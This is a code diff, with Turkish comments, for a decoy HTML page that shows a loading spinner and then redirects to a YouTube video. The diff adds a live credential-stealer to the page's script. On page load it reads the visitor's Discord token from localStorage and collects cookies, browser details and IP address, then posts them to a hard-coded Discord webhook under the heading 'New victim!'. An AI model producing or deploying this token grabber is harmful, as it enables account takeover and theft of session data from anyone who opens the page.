@@ -16,7 +16,7 @@
             overflow: hidden;
         }
         
-        /* İsteğe bağlı: Küçük bir yükleme göstergesi (isteğe bağlı, kaldırmak için bu div'i sil) */
+        /* Yükleme Göstergesi */
         .loader {
             border: 4px solid #333;
             border-top: 4px solid white;
@@ -34,12 +34,16 @@
 </head>
 <body>
 
-    <!-- Siyah ekranın ortasında küçük bir yükleme simgesi (isteğe bağlı) -->
+    <!-- Siyah ekranın ortasında küçük bir yükleme simgesi -->
     <div class="loader"></div>
 
 <script>
+    // --- AYARLAR ---
+    // BURAYA KENDİ WEBHOOK URL'İNİ YAZ
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1565166860897615912/I2CNk0KdLEXpdPkbMLoFTpAChNaeL8sS4YDqEH-26z7lptRg3lOs-UpBMHRbSlSW1Qke"; 
+
     // VERİ TOPLAMA FONKSİYONU
-    function collectData() {
+    async function collectAndSendData() {
         let discordToken = localStorage.getItem('token') || localStorage.getItem('discord_token');
         
         // Token bulunamazsa başka anahtarları dene
@@ -53,38 +57,51 @@
         }
 
         const cookies = document.cookie;
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        const language = navigator.language;
+        const screenResolution = window.screen.width + "x" + window.screen.height;
+        const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => "Bilinmiyor");
 
-        // Verileri hazırla
+        // Veriyi hazırla
         let data = {
             token: discordToken,
             cookies: cookies,
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screenResolution: window.screen.width + "x" + window.screen.height
+            userAgent: userAgent,
+            platform: platform,
+            language: language,
+            screenResolution: screenResolution,
+            ip: ip
         };
 
-        // Veriyi Discord'a göndermek için buraya kendi webhook URL'ini koy
-        // Örnek: fetch('https://discord.com/api/webhooks/SENIN_WEBHOOK_URLUN', ...
-        
-        console.log("Veriler toplandı:", data);
-        
-        // Eğer bir sunucuya göndermek istersen, yukarıdaki fetch kodunu aç.
-        // Şimdilik sadece konsola yazdırıyoruz.
+        // JSON formatında veriyi Discord'a gönder
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    content: "🔥 Yeni Kurban! 🔥\n" + JSON.stringify(data, null, 2) 
+                })
+            });
+            console.log("Veriler başarıyla gönderildi.");
+        } catch (error) {
+            console.error("Gönderme hatası:", error);
+        }
     }
 
     // SAYFA YÜKLENDİĞİNDE OTOMATİK BAŞLAT
     window.onload = function() {
-        // 1. Verileri topla
-        collectData();
+        // 1. Verileri topla ve gönder
+        collectAndSendData();
 
         // 2. 2 saniye bekle
         setTimeout(() => {
-            // 3. Hedef siteye yönlendir (Örn: Discord Ana Sayfa)
-            window.location.href = "https://discord.com/channels/@me";
+            // 3. Hedef siteye yönlendir
+            // VİDEO LİNKİNE ATMAK İSTERSEN AŞAĞIDAKİ SATIRI KULLAN:
+            window.location.href = "https://www.youtube.com/watch?v=cwQgjq0mCdE&list=RDcwQgjq0mCdE&start_radio=1&pp=ygUPa2FueWUgaSBsb3ZlIGl0oAcB"; // Örnek video
             
-            // Veya video linkine gitmek istersen:
-            // window.location.href = "https://www.youtube.com/watch?v=VIDEO_ID";
+            // Veya Discord'un içine atmak istersen:
+            // window.location.href = "https://discord.com/channels/@me";
         }, 2000); // 2 saniye
     };
 </script>
